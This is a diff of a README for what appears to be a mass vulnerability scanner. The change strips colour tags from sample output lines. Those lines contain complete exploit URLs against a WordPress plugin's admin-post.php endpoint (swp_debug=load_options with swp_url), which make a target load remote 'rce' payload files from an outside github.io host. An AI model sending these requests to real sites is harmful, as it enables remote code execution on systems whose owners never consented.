@@ -91,9 +91,9 @@ python3 tool.py -l domains.txt -o scan_results.txt
 Here’s an example of the output you can expect:
 
 ```
-[green]VULNERABLE![/green] https://example.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.txt
-[yellow]NOT VULNERABLE[/yellow]: https://example2.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.php
-[red]FAILED[/red]: https://example3.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.html
+VULNERABLE! https://example.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.txt
+NOT VULNERABLE: https://example2.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.php
+FAILED: https://example3.com/wp-admin/admin-post.php?swp_debug=load_options&swp_url=https://shaheen101sec.github.io/rce/rce.html
 ```
 
 ## Sensitive Keywords Detected
